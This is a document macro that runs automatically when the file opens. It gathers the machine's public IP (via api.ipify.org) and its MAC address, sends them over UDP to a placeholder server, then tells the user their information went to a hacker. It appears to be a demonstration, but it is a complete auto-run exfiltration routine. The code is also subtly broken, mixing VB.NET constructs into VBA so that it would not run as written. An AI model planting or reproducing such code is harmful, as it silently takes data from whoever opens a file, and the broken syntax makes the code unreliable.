Imports System.Net.Sockets
Imports System.Text

Private Sub Document_Open()
    ' Get and store the public IP address
    Dim publicIP As String
    publicIP = GetPublicIPAddress()

    ' Get and store the MAC address
    Dim macAddress As String
    macAddress = GetMacAddress()

    ' Check if both values are retrieved successfully
    If publicIP = "" Or macAddress = "" Then
        Dim message As String
        message = ""
        If publicIP = "" Then
            message = "Could not retrieve the public IP address."
        End If
        If macAddress = "" Then
            If message <> "" Then
                message = message & vbCrLf
            End If
            message = message & "Could not retrieve the MAC address."
        End If
        MsgBox message
        Exit Sub ' Beenden, wenn eine der Adressen nicht abgerufen werden kann
    End If

    ' Speichern der IP- und MAC-Adresse in einem Array
    Dim addressData(1) As String
    addressData(0) = publicIP
    addressData(1) = macAddress

    ' Erstellen der Nachricht, die gesendet werden soll
    Dim dataToSend As String
    dataToSend = "IP: " & addressData(0) & vbCrLf & "MAC: " & addressData(1)

    ' Definieren der Ziel-IP-Adresse und des Ziel-Ports
    Dim serverIp As String
    serverIp = "192.168.1.1" ' Beispiel-IP-Adresse
    Dim serverPort As Integer
    serverPort = 8080 ' Beispiel-Portnummer

    ' Senden der Daten via UDP
    Using client As New UdpClient()
        Try
            ' Konvertieren der Daten in ein Byte-Array
            Dim data As Byte()
            data = Encoding.UTF8.GetBytes(dataToSend)

            ' Daten senden
            client.Send(data, data.Length, serverIp, serverPort)
        Catch ex As Exception
            MsgBox "Fehler beim Senden der Daten: " & ex.message
        End Try
    End Using

    ' Bestätigung, dass die Daten gesendet wurden
    MsgBox "Congrats, your information got sent to a hacker!"
End Sub

Private Function GetMacAddress() As String
    Dim macAddress As String
    macAddress = ""
    
    Dim nic As Object
    For Each nic In CreateObject("WinMgmts://").ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
        macAddress = nic.macAddress
        Exit For
    Next

    GetMacAddress = macAddress
End Function

Private Function GetPublicIPAddress() As String
    On Error GoTo ErrorHandler
    
    ' Use an external service to get the public IP address
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    ' URL of a service that returns the public IP address as plain text
    http.Open "GET", "https://api.ipify.org", False
    http.Send
    
    ' Get the response text, which is the IP address
    GetPublicIPAddress = http.responseText
    Exit Function
    
ErrorHandler:
    GetPublicIPAddress = ""
End Function
